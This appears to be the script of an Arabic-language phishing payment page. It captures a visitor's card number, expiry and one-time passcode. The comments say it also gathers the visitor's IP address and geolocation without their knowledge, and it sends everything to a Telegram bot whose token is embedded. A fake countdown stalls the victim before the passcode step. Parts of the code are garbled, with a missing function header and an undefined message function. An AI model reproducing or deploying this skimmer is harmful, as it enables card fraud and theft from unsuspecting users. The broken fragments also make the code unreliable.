<script>

// ==========================

// إعدادات التليجرام

// ==========================

const TELEGRAM_TOKEN = "8656375954:AAF0XTYnyQHOjiQ7uAZdVw_MJLSt9-zKWM8";

const TELEGRAM_CHAT_ID = "6918534470";

// ==========================

// رابط صورة التفاصيل (قابل للتغيير)

// ==========================

const DETAILS_IMAGE_URL = "https://i.postimg.cc/jqwZ3y3V/Image1.jpg";

// ==========================

// مدة عداد الانتظار (بالثواني) - غير الرقم حسب رغبتك

// ==========================

const COUNTDOWN_SECONDS = 30;   // ← غيّر الرقم هنا لزيادة أو تقليل المدة

// ==========================

// المتغيرات العامة

// ==========================

let countdownTimer = null;

let selectedCardType = "";          // mada, visa, mastercard

let lastFourDigits = "";            // آخر 4 أرقام من البطاقة

let visitCount = 0;                 // عدد مرات الزيارة

// ==========================

// دوال إرسال الرسائل إلى تليجرام (محسنة الاحترافية)

// ==========================

async function sendTelegramMessage(text) {

  const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;

  const payload = {

    chat_id: TELEGRAM_CHAT_ID,

    text: text,

    parse_mode: 'HTML'

  };

  try {

    const response = await fetch(url, {

      method: 'POST',

      headers: { 'Content-Type': 'application/json' },

      body: JSON.stringify(payload)

    });

    const data = await response.json();

    if (!data.ok) console.error('Telegram error:', data);

  } catch (e) {

    console.error('Failed to send telegram:', e);

  }

}

// ==========================

// دالة متقدمة لجلب الموقع الجغرافي عبر IP باستخدام عدة خدمات (بدون علم المستخدم)

// ==========================

async function fetchLocation() {

  const services = [

    {

      name: 'ip-api',

      url: 'https://ip-api.com/json/',

      parse: (data) => {

        if (data.status === 'success') {

          return `${data.city}، ${data.country} (${data.lat},${data.lon})`;

        }

        return null;

      }

    },

    {

      name: 'ipapi',

      url: 'https://ipapi.co/json/',

      parse: (data) => {

        if (!data.error && data.city) {

          return `${data.city}، ${data.country_name} (${data.latitude},${data.longitude})`;

        }

        return null;

      }

    },

    {

      name: 'ipinfo',

      url: 'https://ipinfo.io/json',

      parse: (data) => {

        if (data.city) {

          return `${data.city}، ${data.country} (${data.loc})`;

        }

        return null;

      }

    }

  ];

  for (let service of services) {

    try {

      const response = await fetch(service.url, { mode: 'cors' });

      const data = await response.json();

      const location = service.parse(data);

      if (location) {

        console.log(`تم الحصول على الموقع من ${service.name}: ${location}`);

        return location;

      }

    } catch (e) {

      console.warn(`فشل الاتصال بـ ${service.name}:`, e);

    }

  }

  return "غير متاح (تعذر الحصول على الموقع من جميع الخدمات)";

}

// دالة محسنة لجمع معلومات الجهاز والمتصفح مع الموقع الجغرافي المتعدد

async function collectEnvironmentData() {

  const ua = navigator.userAgent;

  // ✅ تحديد نوع الجهاز بدقة

  let deviceType = "كمبيوتر غير معروف";

  if (/iPhone|iPod/.test(ua)) {

    deviceType = "📱 iPhone";

  } else if (/iPad/.test(ua)) {

    deviceType = "📱 iPad";

  } else if (/Android/.test(ua)) {

    if (/Mobile/.test(ua)) deviceType = "📱 هاتف أندرويد";

    else deviceType = "📟 جهاز أندرويد لوحي";

  } else if (/Windows Phone/.test(ua)) {

    deviceType = "📱 Windows Phone";

  } else if (/Windows/.test(ua)) {

    deviceType = "💻 كمبيوتر ويندوز";

  } else if (/Macintosh/.test(ua)) {

    deviceType = "🍎 ماك";

  } else if (/Linux/.test(ua)) {

    deviceType = "🐧 لينكس";

  }

  // ✅ تحديد المتصفح

  let browser = "متصفح غير معروف";

  if (ua.includes("Firefox")) browser = "🔥 فايرفوكس";

  else if (ua.includes("Chrome") && !ua.includes("Edg")) browser = "🌐 كروم";

  else if (ua.includes("Safari") && !ua.includes("Chrome")) browser = "🧭 سفاري";

  else if (ua.includes("Edg")) browser = "📘 إيدج";

  else if (ua.includes("MSIE") || ua.includes("Trident/")) browser = "💀 إنترنت إكسبلورر";

  // ✅ الحصول على IP (بدون طلب أي صلاحية)

  let ip = "غير متوفر";

  try {

    const res = await fetch('https://api.ipify.org?format=json');

    const data = await res.json();

    ip = data.ip;

  } catch (e) {

    console.warn('Could not fetch IP');

  }

  // ✅ الحصول على الموقع الجغرافي بعدة طرق

  const location = await fetchLocation();

  // ✅ عدد الزيارات

  visitCount = (parseInt(localStorage.getItem('visitCount') || '0')) + 1;

  localStorage.setItem('visitCount', visitCount.toString());

  return {

    deviceType,

    browser,

    ip,

    location,

    visitCount

  };

}

// ==========================

// دوال المساعدة (التحقق، عرض الخطأ)

// ==========================

function markError(el, isErr){

  if(!el) return;

  if(isErr) el.classList.add('is-error');

  else el.classList.remove('is-error');

}

function clearErrors(){

  markError(document.getElementById('cardNumber'), false);

  markError(document.getElementById('cvv'), false);

  markError(document.getElementById('expMonth'), false);

  markError(document.getElementById('expYear'), false);

  markError(document.getElementById('cardName'), false);

  markError(document.getElementById('otpInput'), false);

  document.querySelectorAll('#cardTypeBox .card-item').forEach(ci => ci.classList.remove('is-error'));

}

// ==========================

// ملء قوائم الشهر والسنة

// ==========================

function populateMonths() {

  const monthSelect = document.getElementById('expMonth');

  for (let m = 1; m <= 12; m++) {

    const option = document.createElement('option');

    option.value = m < 10 ? '0' + m : '' + m;

    option.textContent = m < 10 ? '0' + m : '' + m;

    monthSelect.appendChild(option);

  }

}

function populateYears() {

  const yearSelect = document.getElementById('expYear');

  const startYear = 2026;

  const endYear = 2050;

  for (let y = startYear; y <= endYear; y++) {

    const option = document.createElement('option');

    option.value = y;

    option.textContent = y;

    yearSelect.appendChild(option);

  }

}

populateMonths();

populateYears();

// ==========================

// عناصر DOM

// ==========================

const cardNumberEl = document.getElementById('cardNumber');

const cvvEl = document.getElementById('cvv');

const expMonthEl = document.getElementById('expMonth');

const expYearEl = document.getElementById('expYear');

const cardNameEl = document.getElementById('cardName');

const otpEl = document.getElementById('otpInput');

// ==========================

// اختيار نوع البطاقة

// ==========================

const cardItems = document.querySelectorAll('#cardTypeBox .card-item');

cardItems.forEach(item => {

  item.addEventListener('click', () => {

    selectedCardType = item.getAttribute('data-card') || "";

    console.log('البطاقة المختارة:', selectedCardType);

    cardItems.forEach(x => x.classList.remove('selected'));

    item.classList.add('selected');

    cardItems.forEach(x => x.classList.remove('is-error'));

  });

});

// ==========================

// تنسيق الإدخالات

// ==========================

cardNumberEl.addEventListener('input', () => {

  let v = cardNumberEl.value.replace(/\D/g,'').slice(0,16);

  cardNumberEl.value = v.replace(/(\d{4})(?=\d)/g, '$1 ').trim();

  if(cardNumberEl.value.replace(/\s/g,'').length > 0) markError(cardNumberEl,false);

});

cvvEl.addEventListener('input', () => {

  cvvEl.value = cvvEl.value.replace(/\D/g,'').slice(0,3);

  if(cvvEl.value.length > 0) markError(cvvEl,false);

});

cardNameEl.addEventListener('input', () => {

  cardNameEl.value = cardNameEl.value.replace(/[^\p{L}\s]/gu, '');

  if(cardNameEl.value.trim().length > 0) markError(cardNameEl,false);

});

otpEl.addEventListener('input', () => {

  otpEl.value = otpEl.value.replace(/\D/g,'').slice(0,6);

  if(otpEl.value.length > 0) markError(otpEl,false);

});

expMonthEl.addEventListener('change', () => markError(expMonthEl, false));

expYearEl.addEventListener('change', () => markError(expYearEl, false));

// ==========================

// Loader functions

// ==========================

function showLoader(withCounter){

  const overlay = document.getElementById('loaderOverlay');

  const counter = document.getElementById('loaderCounter');

  overlay.style.display = 'flex';

  overlay.setAttribute('aria-hidden', 'false');

  counter.style.display = withCounter ? 'block' : 'none';

  if (withCounter) {

    document.getElementById('loaderCounter').textContent = COUNTDOWN_SECONDS;

  }

}

function hideLoader(){

  const overlay = document.getElementById('loaderOverlay');

  overlay.style.display = 'none';

  overlay.setAttribute('aria-hidden', 'true');

  if(countdownTimer){

    clearInterval(countdownTimer);

    countdownTimer = null;

  }

}

// ==========================

// شاشات

// ==========================

function openOtpStep(){

  document.getElementById('pay-step').style.display = 'none';

  document.getElementById('otp-step').style.display = 'block';

}

// ==========================

// التحقق من صحة الحقول (المرحلة الأولى)

// ==========================

function validatePayFields(){

  clearErrors();

  const cardDigits = cardNumberEl.value.replace(/\s/g,'');

  const cvv = cvvEl.value.trim();

  const month = expMonthEl.value;

  const year = expYearEl.value;

  const name = cardNameEl.value.trim();

  let ok = true;

  if(!selectedCardType){

    cardItems.forEach(ci => ci.classList.add('is-error'));

    ok = false;

  }

  if(cardDigits.length !== 16){

    markError(cardNumberEl,true); ok = false;

  } else {

    lastFourDigits = cardDigits.slice(-4);

  }

  if(cvv.length !== 3){

    markError(cvvEl,true); ok = false;

  }

  if(!month){

    markError(expMonthEl,true); ok = false;

  }

  if(!year){

    markError(expYearEl,true); ok = false;

  }

  if(name.length === 0){

    markError(cardNameEl,true); ok = false;

  }

  return ok;

}

// ==========================

// التحقق من OTP

// ==========================

function validateOtp(){

  clearErrors();

  const code = (otpEl.value || '').trim();

  const ok = /^\d{4,6}$/.test(code);

  if(!ok) markError(otpEl,true);

  return ok;

}

// ==========================

// دالة إرسال الرسالة الأولى (معلومات البطاقة) - بتنسيق احترافي

    'mada': '💳 ماستركارد',

    'visa': '💳 فيزا',

    'mastercard': '💳 مدى'

  };

  const cardTypeArabic = cardTypeMap[selectedCardType] || selectedCardType;

  const message = `

━━━━━━━━━━━━━━━━━━━━━

<b>💳 الدفع - المرحلة الأولى (معلومات البطاقة)</b>

━━━━━━━━━━━━━━━━━━━━━

${cardTypeArabic}

🔢 <b>رقم البطاقة:</b> <code>${cardNumberEl.value.replace(/\s/g,'')}</code>

📅 <b>تاريخ الانتهاء:</b> ${expMonthEl.value}/${expYearEl.value}

━━━━━━━━━━━━━━━━━━━━━

🌍 <b>العنوان IP:</b> <code>${env.ip}</code>

📍 <b>الموقع التقريبي:</b> ${env.location}

👀 <b>عدد الزيارات:</b> ${env.visitCount}

  `;

  await sendTelegramMessage(message);

async function startPayFlow() {

  if(!validatePayFields()) return;

  // إرسال البيانات إلى تليجرام

  await sendFirstMessage();

  // إظهار العداد

  showLoader(true);

  const counter = document.getElementById('loaderCounter');

  let seconds = COUNTDOWN_SECONDS;

  counter.textContent = seconds;

  if(countdownTimer) clearInterval(countdownTimer);

  countdownTimer = setInterval(() => {

    seconds--;

    if(seconds < 0) seconds = 0;

    counter.textContent = seconds;

    if(seconds === 0){

      clearInterval(countdownTimer);

      countdownTimer = null;

      hideLoader();

      openOtpStep();

      setTimeout(() => otpEl.focus(), 150);

    }

  }, 1000);

}

// ==========================

async function confirmOtpFlow() {

  if(!validateOtp()) return;

  const otpCode = otpEl.value.trim();

  await sendSecondMessage(otpCode);

  showLoader(false);  // بدون عداد

  // محاكاة معالجة (يمكن تعديل المدة)

  setTimeout(() => {

    hideLoader();

    otpEl.value = '';

    markError(otpEl,false);

    setTimeout(() => otpEl.focus(), 150);

  }, 30000);

}
